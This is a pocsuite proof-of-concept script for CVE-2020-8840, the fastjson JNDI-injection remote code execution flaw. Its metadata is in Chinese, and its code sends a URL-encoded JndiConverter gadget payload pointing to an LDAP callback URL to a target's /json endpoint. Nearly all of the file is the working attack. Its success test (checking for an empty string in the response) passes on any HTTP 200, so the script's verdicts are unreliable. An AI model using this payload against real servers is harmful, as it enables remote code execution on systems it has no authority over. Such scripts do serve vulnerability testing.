#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url

class TestPOC(POCBase):
	vulID = '''CVE-2020-8840'''
	cveID = '''CVE-2020-8840'''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = '''1.0'''
	author = '''侯博文'''
	vulDate = '''2020-02-21'''
	createDate = '''2020-02-21'''
	updateDate = '''2020-02-21'''
	name = '''fastjson<=1.2.62远程代码执行漏洞'''
	desc = '''2月19日，NVD发布的Jackson-databind JNDI注入漏洞（CVE-2020-8840），在jackson-databind中的反序列化gadget也同样影响了fastjson，经绿盟科技研究人员分析验证，在开启了autoType功能的情况下（autoType功能默认关闭），该漏洞影响最新的fastjson 1.2.62版本，攻击者利用该漏洞可实现在目标机器上的远程代码执行。
	fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean，由于具有执行效率高的特点，应用范围广泛。请相关用户尽快采取防护措施。
	'''
	solution = '''开启了autoType功能的受影响用户可通过关闭autoType来规避风险（autoType功能默认关闭）'''
	severity = '''高危''' 
	vulType = '''RCE'''
	taskType = ''''''
	references = ['''https://mp.weixin.qq.com/s?__biz=Mzk0MjE3ODkxNg==&mid=2247485658&idx=2&sn=e4d52df2e4fca742f22196fef91b5afa''']
	appName = '''fastjson'''
	appVersion = '''1.2.62'''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']

	def _verify(self):
		self.url,ip,port = parse_ip_port(self.target, 80)
		result = {}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
		}
		ldap_url = 'ldap://127.0.0.1:8085/tzZmGMuy'.replace(':','%3A').replace('/','%2F') # ldap的url
		path = '/json?poc=%7B%22%40type%22%3A%22org%2Eapache%2Exbean%2Epropertyeditor%2EJndiConverter%22%2C%22AsText%22%3A%22'+ldap_url+'"}' #漏洞的路径
		vul_url = make_verify_url(self.url, path, mod=0) #生成完整路径
		resp = req.get(vul_url, headers = headers, verify = False, allow_redirects = False, timeout = 10) 
		if resp.status_code == 200 and '' in resp.content: #判断条件
			result['VerifyInfo'] = http_packet(resp)
			result['VerifyInfo']['URL'] = vul_url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	def _attack(self):
		return self._verify()

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output

register(TestPOC)